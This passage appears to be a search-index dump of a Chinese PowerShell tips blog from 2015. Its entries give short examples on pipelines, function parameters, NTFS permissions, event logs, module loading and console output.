跳出管道","text":"如果您事先知道期望从管道中得到多少个对象，您可以用 Select-Object 命令来停止上游的 cmdlet 执行。这样可以节约很多时间。 这个例子试着在 Windows 文件夹中查找 explorer.exe 的第一个实例。由于 Select-Object 语句的作用，一旦找到第一个实例，管道就结束了。如果没有这个语句，即便已经查找到所需的数据，Get-ChildItem 也会不断地递归扫描 Windows 文件夹。 #requires -Version 3 Get-ChildItem -Path c:\\Windows -Recurse -Filter explorer.exe -ErrorAction SilentlyContinue | Select-Object -First 1 请注意只有在 PowerShell 3.0 以上版本中，Select-Object 才具有中断上游 cmdlet 的能力。在早期的版本中，您仍然会获得前 x 个元素，但是上游的 cmdlet 会得不到“已经获得足够的数据”通知而一直持续执行。","link":"/2015/05/08/aborting-the-pipeline/"},{"title":"PowerShell 技能连载 - 解析 PowerShell 脚本","text":"如果您希望为 PowerShell 脚本语法着色，例如用 HTML 将它们格式化，以下是一个起步示例： 这个例子将读取当前 ISE 编辑器中显示的脚本，然后调用 PowerShell 解析器返回所有 token 的信息。 $content = $psise.CurrentFile.Editor.Text $token = $null $errors = $null $token = [System.Management.Automation.PSParser]::Tokenize($content, [ref]$errors) $token | Out-GridView 您可以简单地使用 Get-Content 来读取任何脚本中的内容。读取到的结果是一个由 token 对象组成的数组。它们包含了语法元素类型，以及起止位置。 该信息是格式化 PowerShell 代码所需要的。您可以为 token 类型指定颜色，并为 PowerShell 代码创建自己的文档。","link":"/2015/05/11/parsing-powershell-scripts/"},{"title":"PowerShell 技能连载 - 互斥参数 (1)","text":"有些时候，PowerShell 的函数参数必须是互斥的：用户只能用这类参数多个中的一个，而不能同时使用。 要创建互斥参数，请将他们指定到不同的参数集中，并且确保定义了一个缺省的参数集（当 PowerShell 无法自动选择正确的参数集时使用）： function Test-ParameterSet { [CmdletBinding(DefaultParameterSetName='number')] param ( [int] [Parameter(ParameterSetName='number', Position=0)] $id, [string] [Parameter(ParameterSetName='text', Position=0)] $name ) $PSCmdlet.ParameterSetName $PSBoundParameters } Test-ParameterSet 函数有两个参数：-id 和 -name。用户只能指定一个参数，而不能同时指定两个参数。这个例子也演示了如何知道用户选择了哪个参数集。","link":"/2015/05/12/mutual-exclusive-parameters/"},{"title":"PowerShell 技能连载 - 互斥参数 (2)","text":"PowerShell 函数中的互斥参数使用“ParameterSetName”属性将参数指定到不同的参数集上（或是参数组上）。 很少人知道可以为一个参数指定多个参数集名。通过这种方法，某个参数可以在一个场景中为可选，但在另外一个场景中为必选。 function Test-ParameterSet { [CmdletBinding(DefaultParameterSetName='NonCredential')] param ( $id, [Parameter(ParameterSetName='LocalOnly', Mandatory=$false)] $LocalAction, [Parameter(ParameterSetName='Credential', Mandatory=$true)] [Parameter(ParameterSetName='NonCredential', Mandatory=$false)] $ComputerName, [Parameter(ParameterSetName='Credential', Mandatory=$false)] $Credential ) $PSCmdlet.ParameterSetName $PSBoundParameters if ($PSBoundParameters.ContainsKey('ComputerName')) { Write-Warning 'Remote Call!' } } Test-ParameterSet 函数显示了如何实现该功能：当“NonCredential”参数集有效时 -ComputerName 是可选的。如果用户使用了 -Credential 参数，那么 -ComputerName 变成了必选的。而如果用户使用了 -LocalAction 参数，那么 -ComputerName 和 -Credential 都变为不可用的了。","link":"/2015/05/13/mutually-exclusive-parameters-part-2/"},{"title":"PowerShell 技能连载 - 使用闭包将变量保持在脚本块内","text":"当您使用脚本块中的变量时，运行脚本块时变量会被求值。 要将变量内容保持住，您可以创建一个新的“闭包”。当创建一个闭包之后，该脚本块持有该变量的值，该值为创建闭包时刻的值。 $info = 1 $code = { $info } $code = $code.GetNewClosure() $info = 2 &amp; $code 如果不使用闭包，该脚本块将显示“2”，因为执行时 $info 的值为 2。通过闭包的作用，该脚本块内包含的值为创建闭包时赋予 $info 的值。","link":"/2015/05/14/use-closures-to-lock-variables-to-script-blocks/"},{"title":"PowerShell 技能连载 - 获取内存消耗值","text":"要了解某个脚本占用内存的大约值，或是当您将结果存入变量时 PowerShell 写入多少内存，以下是一个辅助函数： #requires -Version 2 $script:last_memory_usage_byte = 0 function Get-MemoryUsage { $memusagebyte = [System.GC]::GetTotalMemory('forcefullcollection') $memusageMB = $memusagebyte / 1MB $diffbytes = $memusagebyte - $script:last_memory_usage_byte $difftext = '' $sign = '' if ( $script:last_memory_usage_byte -ne 0 ) { if ( $diffbytes -ge 0 ) { $sign = '+' } $difftext = &quot;, $sign$diffbytes&quot; } Write-Host -Object ('Memory usage: {0:n1} MB ({1:n0} Bytes{2})' -f $memusageMB, $memusagebyte, $difftext) # save last value in script global variable $script:last_memory_usage_byte = $memusagebyte } 您可以在任意时候运行 Get-MemoryUsage，它将返回当前的内存消耗以及和上一次调用之间的变化量。 关键点在于使用垃圾收集器：它是负责清理内存，但是平时并不是立即清理内存。要粗略计算内存消耗时，需要调用垃圾收集器立即释放所有无用的内存，然后报告当前占用的内存。","link":"/2015/05/15/get-memory-consumption/"},{"title":"PowerShell 技能连载 - “Continue” 和标签","text":"当您在循环中使用“Continue”语句时，您可以跳过循环中剩下的语句，然后继续下一次循环。“Break”的工作原理与之相似，不过它不仅结束循环而且将跳过所有剩下的循环。 这引出一个问题：当您使用嵌套的循环时，这些语句影响了哪层循环？缺省情况下，“Continue”针对的是内层的循环，但是通过使用标签，您可以使“Continue”和“Break”指向外层循环。 :outer Foreach ($element in (1..10)) { for ($x = 1000; $x -lt 1500; $x += 100) { &quot;Frequency $x Hz&quot; [Console]::Beep($x, 500) continue outer Write-Host 'I am never seen unless you change the code...' } } 由于这段示例代码的 continue 是针对外层循环的，所以您将见到（以及听到）10 次 1000Hz 的输出。 当您移除“Continue”之后的“outer”标签时，您会听到频率递增的蜂鸣，并且 Write-Host 语句不再被跳过。","link":"/2015/05/18/quot-continue-quot-and-labels/"},{"title":"PowerShell 技能连载 - 跳出管道","text":"有些时候您可能希望当某些条件满足时跳出一个管道。 以下是一种实现该功能的创新方法。它适用于 PowerShell 2.0 以及更高版本。 以下是一段示例代码： filter Stop-Pipeline { param ( [scriptblock] $condition = {$true} ) if (&amp; $condition) { continue } $_ } do { Get-ChildItem c:\\Windows -Recurse -ErrorAction SilentlyContinue | Stop-Pipeline { ($_.FullName.ToCharArray() -eq '\\').Count -gt 3 } } while ($false) 该管道方法递归扫描 Windows 文件夹。代码中有一个名为 Stop-Pipeline 的新命令。您可以将一个脚本块传给它，如果该脚本块的执行结果为 $true，该管道将会退出。 在这个例子中，您可以控制递归的深度。当路径中包含三个反斜杠（\\）时，管道将会停止。将数字“3”改为更大的值可以在更深的文件夹中递归。 这个技巧的使用前提是管道需要放置在一个“do”循环中。因为 Stop-Pipeline 主要的功能是当条件满足时执行“Continue”语句，使 do 循环提前退出。 这听起来不太方便不过它工作得很优雅。以下是一个简单的改动。它将运行一个管道最多不超过 10 秒： $start = Get-Date $MaxSeconds = 10 do { Get-ChildItem c:\\Windows -Recurse -ErrorAction SilentlyContinue | Stop-Pipeline { ((Get-Date) - $start).TotalSeconds -gt $MaxSeconds } } while ($false) 如果您希望保存管道的结果而不是输出它们，只需要在“do”语句之前放置一个变量。 $result = do { Get-Chil...","link":"/2015/05/19/aborting-pipeline/"},{"title":"PowerShell 技能连载 - 测试嵌套深度","text":"当您调用一个函数时，PowerShell 会增加嵌套的深度。当一个函数调用另一个函数，或是一段脚本时，将进一步增加嵌套的深度。以下是一个能够告诉您当前代码嵌套深度的函数： function Test-NestLevel { $i = 1 $ok = $true do { try { $test = Get-Variable -Name Host -Scope $i } catch { $ok = $false } $i++ } While ($ok) $i } 当您设计递归（调用自身的函数）函数时，这种方法十分有用。 以下是使用该技术的示例代码： function Test-Diving { param($Depth) if ($Depth -gt 10) { return } &quot;Diving deeper to $Depth meters...&quot; $currentDepth = Test-NestLevel &quot;calculated depth: $currentDepth&quot; Test-Diving -depth ($Depth+1) } Test-Diving -depth 1 当您运行 Test-Diving 时，该函数将调用自身，直到达到 10 米深。该函数使用一个参数来控制嵌套深度，而 Test-NestLevel 的执行结果将返回相同的数字。 请注意它们的区别：Test-NestLevel 返回所有（绝对的）嵌套级别，而参数告诉您函数调用自己的次数。如果 Test-Diving 包含在其它函数中，那么绝对的级别和相对的级别将会不同： PS C:\\&gt; Test-Diving -Depth 1 diving deeper to 1 meters... calculated depth: 1 diving deeper to 2 meters... calculated depth: 2 diving deeper to 3 meters... calculated depth: 3 diving deeper to 4 meters... calculated depth: 4 diving deeper to 5 meters... calculated depth: 5 diving deeper to 6 meters... calculated depth: 6 diving deeper to 7 meters... calculated depth: 7 diving deeper to 8 meters... calculated depth: 8 diving deeper to 9 meters... calculated depth: 9 diving deeper to 10 meters... calculated depth: 10 PS C:\\&gt; &amp; { Test-Diving -Depth 1 } diving deeper to 1 meters... calculated depth: 2 diving deeper to 2 meters... calculated depth: 3 diving deeper to 3 meters... calculated depth: 4 diving deeper to 4 meters... calculated depth: 5 diving deeper to 5 meters... calculated depth: 6 diving deeper to 6 meters... calculated depth: 7 diving deeper to 7 meters... calculated depth: 8 diving deeper to 8 meters... calculated depth: 9 diving deeper to 9 meters... calculated depth: 10 diving deeper to 10 meters... calculated depth: 11 PS C:\\&gt; Test-NestLevel 总是从当前的代码中返回嵌套的级别到全局作用域。","link":"/2015/05/20/test-nested-depth/"},{"title":"PowerShell 技能连载 - 在控制台输出中使用符号","text":"您知道吗，控制台输出内容可以包括特殊字符，例如复选标记？您所需要做的只是将控制台设成 TrueType 字体，例如“Consolas”。 要显示特殊字体，请使用十进制或十六进制字符代码，例如： [Char]8730 [Char]0x25BA 或者执行内置的“CharacterMap”程序以您选择的控制台字体选择另一个特殊字符。 以下是一个让您在 PowerShell 控制台中得到更复杂提示的示例代码： function prompt { $specialChar1 = [Char]0x25ba Write-Host 'PS ' -NoNewline Write-Host $specialChar1 -ForegroundColor Green -NoNewline ' ' $host.UI.RawUI.WindowTitle = Get-Location } 请注意“prompt”函数必须返回至少一个字符，否则 PowerShell 将使用它的默认提示信息。这是为什么该函数用一个空格作为返回值，并且使用 Write-Host 作为彩色输出的原因。","link":"/2015/05/21/using-symbols-in-console-output/"},{"title":"PowerShell 技能连载 - 在控制台输出中使用绿色的复选标记","text":"在前一个技能中您已见到了如何使 PowerShell 控制台支持 TrueType 字体中所有可用的字符。您只需要将字符代码转换为“Char”类型即可。 以下是一个更高级的示例代码，使用了 splatting 技术将一个绿色的复选标记插入您的控制台输出中： $greenCheck = @{ Object = [Char]8730 ForegroundColor = 'Green' NoNewLine = $true } Write-Host &quot;Status check... &quot; -NoNewline Start-Sleep -Seconds 1 Write-Host @greenCheck Write-Host &quot; (Done)&quot; 这样当您需要一个绿色的复选标记时，使用这行代码： Write-Host @greenCheck 如果该复选标记并没有显示出来，请确保您的控制台字体设置成了 TrueType 字体，例如“Consolas”。您可以点击控制台标题栏左上角的图标，并选择“属性”来设置字体。","link":"/2015/05/22/using-green-checkmarks-in-console-output/"},{"title":"PowerShell 技能连载 - 查找大写字符","text":"如果您希望查找大写字符，那么可以使用正则表达式。然而，您也可以提供一个大写字符的列表作为对比使用。一个更灵活的办法是使用 .NET 的 IsUpper() 函数。 以下是一段示例代码：它逐字符扫描一段文本，然后返回首个大写字符的位置： $text = 'here is some text with Uppercase letters' $c = 0 $position = foreach ($character in $text.ToCharArray()) { $c++ if ([Char]::IsUpper($character)) { $c break } } if ($position -eq $null) { 'No uppercase characters detected.' } else { &quot;First uppercase character at position $position&quot; $text.Substring(0, $position) + &quot;&lt;&lt;&lt;&quot; + $text.Substring($position) } 执行的结果类似这样： PS C:\\&gt; First uppercase character at position 24 here is some text with U&lt;&lt;&lt;ppercase letters","link":"/2015/05/25/finding-uppercase-characters/"},{"title":"PowerShell 技能连载 - 根据大写字符分割文本","text":"要在一段文本的每个大写字符出分割这段文本，而不用提供一个大写字符的列表，请试试这个例子： $text = 'MapNetworkDriveWithCredential' [Char[]]$raw = foreach ($character in $text.ToCharArray()) { if ([Char]::IsUpper($character)) { ' ' } $character } $newtext = (-join $raw).Trim() $newtext","link":"/2015/05/26/splitting-text-at-uppercase-letters/"},{"title":"PowerShell 技能连载 - 查找可执行程序","text":"许多文件扩展名都被关联为可执行程序。您可以使用 Invoke-Item 来打开一个可执行的文件。 然而，查找哪些文件扩展名是可执行程序却不是那么简单。您可以读取 Windows 注册表，然后自己查找这些值。如果您采用这种方法，请注意 32/64 位的问题。 另外一个方法是使用 Windows API。以下示例代码演示了它是如何工作的。如果您使用了这种方法，您可以将重活交给操作系统做。付出的代价是一堆调用内部 API 函数的 C# 代码。 $Source = @&quot; using System; using System.Text; using System.Runtime.InteropServices; public class Win32API { [DllImport(&quot;shell32.dll&quot;, EntryPoint=&quot;FindExecutable&quot;)] public static extern long FindExecutableA(string lpFile, string lpDirectory, StringBuilder lpResult); public static string FindExecutable(string pv_strFilename) { StringBuilder objResultBuffer = new StringBuilder(1024); long lngResult = 0; lngResult = FindExecutableA(pv_strFilename, string.Empty, objResultBuffer); if(lngResult &gt;= 32) { return objResultBuffer.ToString(); } return string.Format(&quot;Error: ({0})&quot;, lngResult); } } &quot;@ Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue $FullName = 'c:\\Windows\\windowsupdate.log' $Executable = [Win32API]::FindExecutable($FullName) &quot;$FullName will be launched by $Executable&quot; 一个已知的限制是 FindExecutable() 的使用前提是该文件必须存在。您无法只通过文件扩展名来断定是否为一个可执行文件。","link":"/2015/05/27/finding-executable/"},{"title":"PowerShell 技能连载 - 在后台播放声音","text":"如果您的脚本执行起来需要较长时间，您可能会希望播放一段系统声音文件。以下是一个实现该功能的示例代码： # find first available WAV file in Windows $WAVPath = Get-ChildItem -Path $env:windir -Filter *.wav -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName # load file and play it $player = New-Object Media.SoundPlayer $WAVPath try { $player.PlayLooping() 'Doing something...' 1..100 | ForEach-Object { Write-Progress -Activity 'Doing Something. Hang in' -Status $_ -PercentComplete $_ Start-Sleep -MilliSeconds (Get-Random -Minimum 300 -Maximum 1300) } } finally { $player.Stop() } 这段示例代码使用 Windows 文件夹中找到的第一个 WAV 文件，然后在脚本的执行期间播放它。您当然也可以指定其它 WAV 文件的路径。","link":"/2015/05/28/playing-sound-in-the-background/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 的帮助窗口作为通用输出","text":"要显示文本信息，您当然可以启动 noteapd.exe，并且用编辑器来显示文本。不过，在编辑器中显示文本并不是一个好主意，如果您不希望文本被改变。 PowerShell 给我们带来了一个很棒的窗体，用来显示一小段或者中等长度的文本：内置的帮助窗口。 通过一些调整，该窗口可以重新编程，显示任意的文本信息。而且，您可以使用内置的全文搜索功能在您的文本中导航，甚至可以根据你的喜好设置前景色和背景色。 只需要将任意的文本通过管道传递给 Out-Window，并且根据需要可选地指定颜色、搜索词和标题。以下是 Out-Window 函数： function Out-Window { param ( [String] $Title = 'PowerShell Output', [String] $FindText = '', [String] $ForegroundColor = 'Black', [String] $BackgroundColor = 'White' ) # take all pipeline input: $allData = @($Input) if ($allData.Count -gt 0) { # open window in new thread to keep PS responsive $code = { param($textToDisplay, $FindText, $Title, $ForegroundColor, $BackgroundColor) $dialog = (New-Object –TypeName Microsoft.Management.UI.HelpWindow($textToDisplay)) $dialog.Title = $Title $type = $dialog.GetType() $field = $type.GetField('Settings', 'NonPublic,Instance') $button = $field.GetValue($dialog) $button.Visibility = 'Collapsed' $dialog.Show() $dialog.Hide() $field = $type.GetField('Find', 'NonPublic,Instance') $textbox = $field.GetValue($dialog) $textbox.Text = $FindText $field = $type.GetField('HelpText', 'NonPublic,Instance') $RTB = $field.GetValue($dialog) $RTB.Background = $BackgroundColor $RTB.Foreground = $ForegroundColor $method = $type.GetMethod('MoveToNextMatch', [System.Reflection.BindingFlags]'NonPublic,Instance') $method.Invoke($dialog, @($true)) $dialog.ShowDialog() } $ps = [PowerShell]::Create() $newRunspace = [RunSpaceFactory]::CreateRunspace() $newRunspace.ApartmentState = 'STA' $newRunspace.Open() $ps.Runspace = $newRunspace $null = $ps.AddScript($code).AddArgument(($allData | Format-Table -AutoSize -Wrap | Out-String -Width 100)).AddArgument($FindText).AddArgument($Title).AddArgument($ForegroundColor).AddArgument($BackgroundColor) $null = $ps.BeginInvoke() } } 调用的示例如下： Get-Content C:\\Windows\\windowsupdate.log | # limit to first 100 lines (help window is not designed to work with huge texts) Select-Object -First 100 | Out-Window -Find Success -Title 'My Output' -Background Blue -Foreground White 请记住两件事： 帮助窗口并不是设计为显示大量文本的。请确保使用该方法显示不超过几 KB 的文本。 这只是试验性的代码。它并没有清除 PowerShell 用来显示窗体所创建的线程。当您关闭该线程时，该 PowerShell 线程将保持在后台运行，直到您关闭 PowerShell。我们需要为帮助窗口关闭事件增加一个事件处理器。该事件处理器可以清理该 PowerShell 线程。","link":"/2015/05/29/using-powershell-s-help-window-for-general-output/"},{"title":"PowerShell 技能连载 - 显示函数参数","text":"通过一个简单的技巧，您可以创建一个对话框窗口来帮助用户提供您写的函数的所需要参数。 只需要使用 $PSBoundParameters 来判定用户是否传入了参数。如果用户未传入参数，那么请运行 Show-Command 并传入您的函数名，然后返回您的函数，其它什么也不用做。 Show-Command 自动解决剩下的部分：它会显示一个包括所有函数参数的对话框，当用户点击“运行”时，它将以提交的参数运行该函数。 function Show-PromptInfo { param ( [string] $Name, [int] $ID ) if ($PSBoundParameters.Count -eq 0) { Show-Command -Name Show-PromptInfo return } &quot;Your name is $name, and the id is $id.&quot; } 当您执行 Show-PromptInfo 函数时传入了正确的参数，则将立即执行该函数的内容。 PS&gt; Show-PromptInfo -Name weltner -ID 12 Your name is weltner, and the id is 12. PS&gt; Show-PromptInfo &lt;# Dialog opens, then runs the function with submitted parameters#&gt; 当您执行该函数时没有传入任何参数，则将弹出一个对话框，提示您交互式地输入参数。","link":"/2015/06/01/prompting-for-function-parameters/"},{"title":"PowerShell 技能连载 - 分割超长代码行","text":"为了提高可读性，您可以将超长的 PowerShell 代码行拆分成多行。 Get-Service | Where-Object { $_.Status -eq 'Running' } Get-Service | Where-Object { $_.Status -eq 'Running' } 在管道符之后，您可以加入一个换行。您也可以安全地在一个左大括号之后、右大括号之前加入一个换行： Get-Service | Where-Object { $_.Status -eq 'Running' } 如果您需要在其它地方换行，那么请在换行之前加入一个反引号： Get-Service | Where-Object ` { $_.Status -eq 'Running' }","link":"/2015/06/02/splitting-long-lines/"},{"title":"PowerShell 技能连载 - 创建一个包含 NTFS 权限的文件夹","text":"您常常会需要创建一个文件夹并且为它设置 NTFS 权限。 这是一个简单的创建新文件夹并演示如何向已有权限中增加新的权限的示例代码： $Path = 'c:\\protectedFolder' # create new folder $null = New-Item -Path $Path -ItemType Directory # get permissions $acl = Get-Acl -Path $path # add a new permission $permission = 'Everyone', 'FullControl', 'ContainerInherit, ObjectInherit', 'None', 'Allow' $rule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $permission $acl.SetAccessRule($rule) # add another new permission # WARNING: Replace username &quot;Tobias&quot; with the user name or group that you want to grant permissions $permission = 'Tobias', 'FullControl', 'ContainerInherit, ObjectInherit', 'None', 'Allow' $rule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $permission $acl.SetAccessRule($rule) # set new permissions $acl | Set-Acl -Path $path","link":"/2015/06/03/create-folder-with-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 管理 NTFS 权限","text":"在前一个技能中我们演示了如何向一个文件夹增加 NTFS 权限。要查看可以设置哪些权限，看以下示例： PS&gt; [System.Enum]::GetNames([System.Security.AccessControl.FileSystemRights]) ListDirectory ReadData WriteData CreateFiles CreateDirectories AppendData ReadExtendedAttributes WriteExtendedAttributes Traverse ExecuteFile DeleteSubdirectoriesAndFiles ReadAttributes WriteAttributes Write Delete ReadPermissions Read ReadAndExecute Modify ChangePermissions TakeOwnership Synchronize FullControl 假设您已创建了一个名为“_protectedfolder_”的文件夹： $Path = 'c:\\protectedFolder' # create new folder $null = New-Item -Path $Path -ItemType Directory 要为“_Tobias_”用户（请将用户名替换为您系统中实际存在的用户名）增加文件系统权限，请运行这段代码： # get permissions $acl = Get-Acl -Path $path # add a new permission $permission = 'Tobias', 'Read,Write,Modify', 'ContainerInherit, ObjectInherit', 'None', 'Allow' $rule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $permission $acl.SetAccessRule($rule) # set new permissions $acl | Set-Acl -Path $path","link":"/2015/06/04/managing-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 获取非继承的 NTFS 权限","text":"要查看某个文件或者文件夹被直接赋予了哪些 NTFS 权限，请注意“isInherited”属性。这段代码将创建一个名为“_sampleFolderNTFS_”的新文件夹，并且列出所有非继承的 NTFS 权限。当您创建该文件夹时，它只拥有继承的权限，所以您查看非继承权限的时候获得不到任何结果： $Path = 'c:\\sampleFolderNTFS' # create new folder $null = New-Item -Path $Path -ItemType Directory -ErrorAction SilentlyContinue # get permissions $acl = Get-Acl -Path $path $acl.Access | Where-Object { $_.isInherited -eq $false } 当您增加了非继承权限时，这段代码将会产生结果。这是通过 PowerShell 增加非继承权限的方法。它将针对当前用户添加读、写、修改权限： $acl = Get-Acl -Path $path # add a new permission $permission = $env:username, 'Read,Write,Modify', 'ContainerInherit, ObjectInherit', 'None', 'Allow' $rule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $permission $acl.SetAccessRule($rule) # set new permissions $acl | Set-Acl -Path $path","link":"/2015/06/05/getting-explicit-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 移除非继承的 NTFS 权限","text":"在前一个例子中，我们演示了如何向已有的文件夹添加新的 NTFS 权限。如果您希望重置权限并且移除所有之前所有非继承的 NTFS 权限，以下是示例代码： # make sure this folder exists $Path = 'c:\\sampleFolderNTFS' # get explicit permissions $acl = Get-Acl -Path $path $acl.Access | Where-Object { $_.isInherited -eq $false } | # ...and remove them ForEach-Object { $acl.RemoveAccessRuleAll($_) } # set new permissions $acl | Set-Acl -Path $path","link":"/2015/06/08/removing-explicit-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 管理 NTFS 权限继承","text":"缺省情况下，文件和文件夹从它们的父节点继承权限。要停用继承，并且只保留显式权限，请做以下两件事情：增加你需要显式权限，然后禁止继承。 这个示例代码创建了一个名为“_PermissionNoInheritance_”的文件夹，然后为当前用户赋予读权限，为管理员组赋予完整权限，并且禁止继承。 # create folder $Path = 'c:\\PermissionNoInheritance' $null = New-Item -Path $Path -ItemType Directory -ErrorAction SilentlyContinue # get current permissions $acl = Get-Acl -Path $path # add a new permission for current user $permission = $env:username, 'Read,Modify', 'ContainerInherit, ObjectInherit', 'None', 'Allow' $rule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $permission $acl.SetAccessRule($rule) # add a new permission for Administrators $permission = 'Administrators', 'FullControl', 'ContainerInherit, ObjectInherit', 'None', 'Allow' $rule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $permission $acl.SetAccessRule($rule) # disable inheritance $acl.SetAccessRuleProtection($true, $false) # set new permissions $acl | Set-Acl -Path $path","link":"/2015/06/09/manage-ntfs-permission-inheritance/"},{"title":"PowerShell 技能连载 - 创建动态脚本块","text":"脚本块是一段可执行的 PowerShell 代码。您通常可以将语句包裹在大括号中创建脚本块。 若要在脚本中动态创建脚本块，以下是将一个字符串转换为脚本块的方法。 $scriptblock = [ScriptBlock]::Create('notepad') 通过这种方法，您的代码首先以字符串的形式创建代码，然后将字符串转换为脚本块，然后将脚本块传递给您需要的 cmdlet（例如 Invoke-Command）： PS&gt; Invoke-Command -ScriptBlock 'notepad' Cannot convert the &quot;notepad&quot; value of type &quot;System.String&quot; to type &quot;System.Management.Automation.ScriptBlock&quot;. (raised by: Invoke-Command) PS&gt; Invoke-Command -ScriptBlock ([ScriptBlock]::Create('notepad'))","link":"/2015/06/10/create-dynamic-script-blocks/"},{"title":"PowerShell 技能连载 - 安装 Windows 功能","text":"在服务器中，Powershell 可以通过 Install-WindowsFeature 命令安装 Windows 功能。 若您将 Install-WindowsFeature 返回的结果保存下来，则可以用 Get-WindowsFeature 查看安装的状态： # install features on server and save result in $result Install-WindowsFeature -Name AD-Domain-Services, DNS -IncludeManagementTools -OutVariable result -Verbose # view the result of your change Get-WindowsFeature -Name $result.FeatureResult.Name","link":"/2015/06/11/installing-windows-features/"},{"title":"PowerShell 技能连载 - 获取 CPU 核心和处理器信息","text":"通过一行 WMI 代码，就可以查看您的 CPU 详情： PS&gt; Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Number* Name NumberOfCores NumberOfLogicalProcessors ---- ------------- ------------------------- Intel(R) Core(TM) i7-26... 2 4","link":"/2015/06/12/get-cpu-cores-and-processor-information/"},{"title":"PowerShell 技能连载 - 如何查找包含指定参数的命令","text":"Get-Command 是当您需要查找某个命令来完成一件事情时的主要工具。 您可以这样搜索动词和/或名词： # find all cmdlets/functions that stop things Get-Command -Verb Stop # find all cmdlets/functions that affect services Get-Command -Noun Service 从 PowerShell 3.0 开始，Get-Command 还可以根据一个给定的参数查找 cmdlet 或函数： # new in PS3 and better # find all cmdlets/functions with a -ComputerName parameter Get-Command -ParameterName ComputerName 请注意 Get-Command 是在已加载的 cmdlet/函数中搜索。请确保在搜索前已导入了所需的模块。","link":"/2015/06/15/how-to-find-commands-that-have-the-specified-parameter/"},{"title":"PowerShell 技能连载 - 加载 PowerShell 模块","text":"所有的 cmdlet 都位于模块或是 snap-in 中。要查看当前加载了哪些模块，请使用 Get-Module 命令。 在 PowerShell 3.0 或更高版本中，当您运行多数模块中的 cmdlet 时，它们都将被隐式地导入。这种聪明的机制实现了“按需加载”的效果，所以在多数情况下不需要手动加载模块，或是显式地手动加载所有模块。 要关闭自动加载，请使用这行代码： $PSModuleAutoLoadingPreference = 'none' 请注意当您这么做的时候，您有责任加载所有需要的模块。 如果您希望加载所有可用的模块，请使用 Import-Module 命令。 这将读取您整个系统中所有可用的模块： Get-Module -ListAvailable | Import-Module -Verbose","link":"/2015/06/16/loading-powershell-modules/"},{"title":"PowerShell 技能连载 - 从 PSSnapin 中加载 cmdlet","text":"近期多数 cmdlet 都是包装在模块中。模块是从 PowerShell 2.0 开始引入的概念。它们的主要好处是可以复制粘贴部署（不需要安装）以及模块自动加载（当您需要时，PowerShell 将自动加载模块）。 有一些 cmdlet 还是用 PowerShell snap-in (PSSnapin) 的方式包装，而不是采用模块的方式包装。PSSnapin 是从 PowerShell 1.0 就开始引入的。PSSnapin 需要安装才能使用。而且由于它们是注册在 HKEY_LOCAL_MACHINE 中，所以它们安装时往往需要管理员权限。 要列出所有可用的 PSSnapin，请运行这行代码： Get-PSSnapin -Registered 与模块相对，PSSnapin 需要先手动加载，才能使用其中的 cmdlet。这行代码将会加载所有可用的 PSSnapin： Get-PSSnapin -Registered | Add-PSSnapin -Verbose","link":"/2015/06/17/load-cmdlets-from-pssnapins/"},{"title":"PowerShell 技能连载 - 刷新新挂载的磁盘","text":"如果您的脚本刚刚挂载了一个新的驱动器，PowerShell 可能无法立即存取它（例如通过 Get-ChildItem），因为 Powerell 尚未更新它的驱动器列表。 要更新 PowerShell 驱动器列表，请用这行代码： $null = Get-PSDrive","link":"/2015/06/18/refresh-newly-mounted-disks/"},{"title":"PowerShell 技能连载 - 查找最重要的错误系统日志","text":"如果您没有充裕的时间来调查您系统日志中出现频率最高的错误来源，请试试这行代码： Get-EventLog -LogName System -EntryType Error, Warning | Group-Object -Property Source | Sort-Object -Property Count -Descending 当您找到导致一系列错误（或警告）的源头时，这行代码可以显示错误的细节： # change this variable to the name of the source you want # to explore: $source = 'Schannel' Get-EventLog -LogName System -Source $source | Out-GridView","link":"/2015/06/19/finding-the-most-important-event-log-error-sources/"},{"title":"PowerShell 技能连载 - 分析（所有）事件日志源","text":"您也许知道 Get-EventLog 命令。该命令能从一个指定的系统日志中读取所有条目： Get-EventLog -LogName System 然而，Get-EventLog 一次只能查询一个事件日志源。所以如果您希望在所有事件日志源中查找所有错误信息，您需要创建一个循环，并且需要知道事件日志名字。 以下是一个单行的查询所有事件日志的简单技巧： Get-EventLog -List | Select-Object -ExpandProperty Entries -ErrorAction SilentlyContinue | Where-Object { $_.EntryType -eq 'Error' }","link":"/2015/06/22/analyzing-all-event-log-entries/"},{"title":"PowerShell 技能连载 - 快捷循环","text":"适用于 PowerShell 4.0 及以上版本 PowerShell 中有一系列循环的语法。以下是一些 PowerShell 4.0 中循环执行代码的不太常见的方法。这个例子将播放一段频率不断提高的声音（请确保打开了扬声器）： (1..100).Foreach{[Console]::Beep($_ * 100, 300)} 在 PowerShell 4.0 及以上版本，数组拥有了 Where() 和 ForEach() 方法。您可以像这样写一个过滤器： @(Get-Service).Where({$_.Status -eq 'Running'}) PowerShell 的语法糖能让您省略这些语句中的大括号： @(Get-Service).Where{$_.Status -eq 'Running'} 请注意该方法是针对数组的。相对于传统的管道方法，这种方法速度更快，但是内存消耗更大。","link":"/2015/06/23/quick-loop/"},{"title":"PowerShell 技能连载 - 列出所有脚本中的所有变量","text":"是否希望列出 PowerShell ISE 中打开的所有文件中的变量清单？ 以下是一段能够创建这样清单的代码： $psise.CurrentPowerShellTab.Files | ForEach-Object { $errors = $null [System.Management.Automation.PSParser]::Tokenize($_.Editor.Text, [ref]$errors) | Where-Object { $_.Type -eq 'Variable'} | Select-Object -Property Content | Add-Member -MemberType NoteProperty -Name Script -Value $_.DisplayName -PassThru } | Sort-Object -Property Content, Script -Unique","link":"/2015/06/24/listing-all-variables-in-all-scripts/"},{"title":"PowerShell 技能连载 - 将“列出所有变量”功能加入 PowerShell","text":"在前一个技能中我们展示了一个可以显示 PowerShell ISE 中所有打开的脚本的所有变量名的脚本。 